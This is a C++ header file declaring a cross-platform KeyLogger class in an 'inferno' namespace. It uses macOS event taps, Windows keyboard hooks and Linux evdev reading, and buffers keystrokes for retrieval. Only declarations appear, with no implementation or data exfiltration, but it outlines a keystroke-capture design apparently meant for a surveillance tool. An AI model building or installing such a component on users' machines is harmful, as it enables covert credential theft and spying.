#pragma once

#include <string>
#include <mutex>
#include <atomic>

#include <thread>

#ifdef __APPLE__
#include <CoreGraphics/CoreGraphics.h>
#elif defined(_WIN32)
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#endif

namespace inferno {

class KeyLogger {
public:
    KeyLogger();
    ~KeyLogger();
    KeyLogger(const KeyLogger&)            = delete;
    KeyLogger& operator=(const KeyLogger&) = delete;

    void start();
    void stop();
    [[nodiscard]] bool isRunning() const;

    // Returns the buffer contents and atomically clears it.
    std::string dump();

    // Maximum buffer size — safety cap to prevent OOM on long sessions.
    static constexpr size_t MAX_BUFFER_SIZE = 1024 * 1024; // 1MB

#ifdef INFERNO_TESTING
    // Test-only: injects a character directly into the buffer
    // without requiring a real keyboard event or OS hook.
    void injectKeystroke(char c);
#endif

private:
    std::string              m_buffer;
    mutable std::mutex       m_mutex;
    std::atomic<bool>        m_running;

#ifdef __APPLE__
    // Platform Exception: CFRunLoop thread for CGEventTap delivery
    std::thread              m_runloop_thread;
    CFRunLoopRef             m_runloop;
    CFMachPortRef            m_event_tap;
    CFRunLoopSourceRef       m_runloop_source;
    static CGEventRef        eventCallback(CGEventTapProxy proxy, CGEventType type,
                                           CGEventRef event, void* refcon);
    void appendKeystroke(const std::string& stroke);
#elif defined(_WIN32)
    std::thread              m_hook_thread;
    HHOOK                    m_keyboard_hook;
    DWORD                    m_hook_thread_id;
    static LRESULT CALLBACK  keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
    static KeyLogger*        s_instance;
    void appendKeystroke(const std::string& stroke);
#elif defined(__linux__)
    int                      m_input_fd;
    std::thread              m_evdev_thread;
    std::string              m_device_path;
    bool                     m_left_shift_pressed;
    bool                     m_right_shift_pressed;
    bool                     m_caps_active;
    bool                     m_left_ctrl_pressed;
    bool                     m_right_ctrl_pressed;
    bool                     m_left_alt_pressed;
    bool                     m_right_alt_pressed;
    void appendKeystroke(const std::string& stroke);
    std::string findKeyboardDevice();
    void evdevLoop();
#endif
};

} // namespace inferno
